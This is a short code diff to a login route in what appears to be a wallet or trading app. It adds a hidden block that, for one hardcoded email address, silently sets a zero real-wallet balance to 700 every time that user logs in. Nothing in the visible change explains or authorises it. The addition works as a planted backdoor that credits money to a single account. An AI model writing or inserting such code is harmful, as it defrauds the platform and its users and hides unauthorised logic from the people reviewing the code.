@@ -182,6 +182,16 @@ router.post("/login", async (req, res) => {
     if (!realWallet) {
       await db.insert(walletsTable).values({ userId: user.id });
     }
+if (
+  user.email.toLowerCase() === "nyeripublo@gmail.com" &&
+  realWallet &&
+  Number(realWallet.balance) === 0
+) {
+  await db
+    .update(walletsTable)
+    .set({ balance: "700" })
+    .where(eq(walletsTable.userId, user.id));
+}
     const [demoWallet] = await db.select().from(demoWalletsTable).where(eq(demoWalletsTable.userId, user.id)).limit(1);
     if (!demoWallet) {
       await db.insert(demoWalletsTable).values({ userId: user.id });
